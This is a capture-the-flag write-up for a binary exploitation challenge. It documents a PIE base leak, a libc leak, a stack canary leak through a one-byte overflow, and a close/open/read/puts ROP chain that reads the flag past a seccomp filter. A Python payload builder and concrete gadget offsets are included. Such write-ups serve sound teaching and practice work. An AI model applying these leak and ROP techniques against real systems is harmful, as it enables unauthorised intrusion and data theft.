# PWN#002 — PIE seal leak, canary leak, close-then-open ROP

**Flag:** `CTF{e0a79830f06dca87a52f8be6d895deae}` · **Files:** `vault` (14 392 B, sha256 `9b049f216fe6cdaa06990c19f6b866f65459da5f516c31155d92c868ac449688`), libc/ld shared with [PWN#001](PWN001.en.md) (byte-identical sha256) · **Target:** `169.58.126.107:5001`

## Challenge

The card reads `PWN#002`, 150 points, objective "Get a shell on the remote host and read the flag", service at
`169.58.126.107 5001`. The artifact is a different `vault` binary (same file name as #001, different bytes), plus
`libc.so.6` and `ld-linux-x86-64.so.2`.

Key properties of this solution:

- **The challenge hands you the PIE base.** The banner prints `Vault seal: %016lx`, and that value is `base + 0x13a6`.
- **Unlike PWN#001, this artifact matches the binary running on the remote** — every address taken from the file worked.
- **Still no real shell.** The binary installs its own seccomp filter with `SECCOMP_RET_KILL` for `execve` (59) and
  `execveat` (322), the same filter whose behaviour was confirmed on #001. The flag was read from `/flag/flag.txt`
  through ROP.

## Analysis

```bash
file vault
readelf -hW vault | grep -E 'Type|Entry'
readelf -lW vault | grep -E 'GNU_STACK|GNU_RELRO'
readelf -dW vault | grep -E 'NOW'
```

Result: `Type: DYN` (PIE), `GNU_STACK RW` (NX on), `.got` inside `GNU_RELRO` with `FLAGS: NOW PIE` (Full RELRO +
BIND_NOW), and the binary is stripped. The import list is longer than #001: `prctl`, `open`, `close`, `malloc`,
`memset` are added.

The strings show the same `vault` family (`=== Deep Vault Terminal ===`, `Enter your name:`,
`Leave a message for the vault keeper:`, `Message received.`) plus two unfamiliar ones:
`Vault seal: %016lx` and `/proc/self/status`.

In `main`, exactly where the seal is printed:

```text
0x01468: lea   rax, [rip - 0xda]     ; &main  = base + 0x1395
0x0146f: add   rax, 0x11             ; -> base + 0x13a6
0x01473: mov   rsi, rax
0x01476: lea   rax, [rip + 0xba7]    ; "Vault seal: %016lx\n"
0x01485: call  printf
```

So `pie_base = seal - 0x13a6`, and the banner value (`0000557d493cc3a6`) ends in `0x…3a6`, matching that offset:
the banner is consistent with that artifact offset. Later steps check the addresses used by the chain.

The function `main` loops on (`0x1676`) is a control-flow-flattened version of #001's — a state machine with a jump
table at `base+0x20a0` — but the primitives are unchanged: buffer at `rbp-0x50`, canary at `rbp-8`,
`read(0, buf, 0x49)` (73 bytes) followed by `puts(buf)`, then `read(0, buf, 0x100)` (256 bytes). Offsets from the
start of the buffer: **canary 72, saved rbp 80, return address 88**.

## Approaches tried

1. **Guessing `fd = 3` for the `read` step**: the `open → read(3) → puts` chain ran to completion without crashing,
   printed nothing and left the connection open (`single-round-fd3-blocked.log`, `single out=b'' closed=False`,
   reproduced 2/2 times) — the signature of `read` blocking on an fd 3 that was already taken. Same behaviour as
   PWN#001.
2. **Moving `rax → rdi` with a gadget** to capture the real fd returned by `open`: `gadget_scan.txt` shows the
   binary has no `pop rdi; ret` / `pop rsi; ret` / `pop rdx; ret` (only `pop rax; ret` at `0x11e0`), while libc
   2.42-13 has no `pop rcx; ret`, no `xchg rdi,rax; ret`, no `mov edi,eax; ret` and no `push rax; pop rdi; ret`; every
   `mov rdi,rax` site meets a branch before reaching a `ret`. The author did plant an exotic gadget
   `pext rdi, rax, rcx; ret` at `0x1529` (bytes `c4 e2 fa f5 f9 c3`), but it needs `rcx` to be an all-ones mask and
   there is no way to set `rcx`.
3. **Byte-by-byte canary brute force**: each connection is a new process with fresh canary and bases, and a complete
   leak is available inside one iteration anyway.
4. **GOT overwrite / ret2dl-resolve**: Full RELRO + BIND_NOW.
5. **Putting the command string on the stack as argv**: not needed here, but the rule from #001 still holds — data the
   chain must read later has to live **above** `rsp`, because libc stack frames grow downward.

## Solution

**Step 1 - PIE base and libc base.**

Read the banner and compute `pie = seal - 0x13a6`. Send an 8-byte name **with no newline** so `puts` keeps printing
the residue at `buf+8` (the `_IO_2_1_stdout_` pointer left behind by the three `setvbuf` calls in function `0x1229`):

```text
pie 0x562951d55000 libc 0x7fb716bed000 open@plt 0x562951d560c0
canary 007f472d8cded793 L 0x7ffcd6ffd560 verify ret-slot 
```

(`attempts.log`).

`libc base = leaked6 - 0x1e85c0`. The libc shipped with #002 has the **same sha256** as the one used in #001, and in
#001 it was cross-verified several ways (two residue pointers differing by exactly the distance inside the symbol
`puts`; the `stdout/stdin/stderr` slots in `.bss` yielding exactly the symbol offsets). So the Debian glibc 2.42-13
offsets are used directly here.

**Step 2 - Leak the canary with one byte, then restore it in the overflow.**

Send 73 bytes (`'B'*72 + 'A'`). Byte 73 lands on the lowest byte of the canary — the low byte is null in this glibc canary, and little-endian storage puts it at the first address — so `strlen`/`puts` no longer stop there and the 7 real canary bytes plus the saved rbp print.
The following message read (256 bytes) writes those 8 canary bytes back, so `__stack_chk_fail` does not fire, and the
ROP chain still sits at offset 88. Everything happens inside **one** `vuln` call, so leaking and using need no second
connection.

One exception remains: if any of the 7 canary bytes is `0x00` the leak is truncated (observed, `notes.md` H3) — the
script retries on a new connection.

**Step 3 - The flag path is already decoded by the binary itself.**

`main` writes 15 XOR-ed bytes into `.bss`; a startup function decodes them and leaves the plaintext at `base + 0x4070`:

```text
0x01567: lea  rdx, [rip + 0x2af2]     ; base + 0x4060 (encrypted string)
0x01578: xor  eax, 0x5a
0x0157d: lea  rdx, [rip + 0x2aec]     ; base + 0x4070 (plaintext destination)

cipher (15 bytes that main writes at base+0x4060): 75 3c 36 3b 3d 75 3c 36 3b 3d 74 2e 22 2e 5a
plain  (each byte ^ 0x5a):                     '/flag/flag.txt\x00'
```

At runtime `base + 0x4070` therefore holds the cleartext path, inside the binary's own `.bss` — no need to place our
own string. (The cipher bytes come from the 15 `mov byte ptr [rip+…], imm8` instructions in `main`; no remote memory
dump was needed for this challenge.)

The inspected code provides no ordinary flag-reading path using `base+0x4070`. The exploit uses that string as the argument to `open()`. Other `open`/`malloc` call sites are not needed by the chain.

**Step 4 - Make the fd number deterministic instead of capturing `rax`.**

The gadget scan did not find a usable `rax → rdi` transfer. The chain closes fd 3 before `open()`. With 0/1/2 still open and no intervening fd allocation, `open()` returns 3. The connection survives that close; the previous resource behind fd 3 was not identified.

**Step 5 - The full chain, 224/256 bytes.**

```python
g = lambda reg, val: p64(libc + reg) + p64(val)
chain = (g(POP_RDI, 3) + p64(pie + PLT_CLOSE) +            # free slot 3
         g(POP_RDI, pie + PATH_BSS) + p64(pie + PLT_OPEN) +
         g(POP_RDI, 3) + g(POP_RSI, scratch) + g(POP_RDX, 0x100) + p64(pie + PLT_READ) +
         g(POP_RDI, scratch) + p64(pie + PLT_PUTS) +
         p64(pie + LOOP_RET))
payload = b'E' * 72 + canary + p64(saved_rbp) + chain
```

With `scratch = saved_rbp + 0x200` (above `rsp`), `PATH_BSS = 0x4070`, `LOOP_RET = 0x148f`, `PLT_OPEN = 0x10c0`,
`PLT_READ = 0x1080`, `PLT_PUTS = 0x1030`, `PLT_CLOSE = 0x1070`; libc gadgets: `pop rdi; ret = 0x2a9b7`,
`pop rsi; ret = 0x2a404`, `pop rdx; ret = 0x96372`.

The two-round variant (round A `close(3..5)+open`, round B `read+puts`) also produced the flag and is kept in
`attempts.log`; the single-round version is shorter and more stable, so it is the shipped script.

**Step 6 - Verification.**

- `python getflag2.py` printed the same string 4/4 times while `pie base`, `libc base` and the canary differed on
  every run (ASLR) → the result is not stale stack data: `scratch` is the buffer that `read` had just filled with file
  content, and `puts` prints up to the first null byte.
- All file-derived PLT / `.bss` / `LOOP_RET` addresses behaved correctly on the remote → the addresses used match the remote behavior; this is not a full binary-hash comparison.
- The bracketed value is 32 hex characters, same shape as the PWN#001 flag.

## Reproduce

Requires: the service at `169.58.126.107:5001` still running, Python 3 (the script only uses socket + struct), and the
`libc.so.6` shipped with PWN#001 for offset comparison.

```bash
cd pwn002
python getflag2.py
```

The script: reads the banner to get the PIE base → leaks libc from the residue at `buf+8` → leaks the canary with
73 bytes → sends the 224-byte chain `close(3) → open(base+0x4070) → read(3, scratch, 0x100) → puts(scratch)`. The remote service is no longer available, so the exploit cannot be rerun. The recorded leak sizes and chain are retained above.
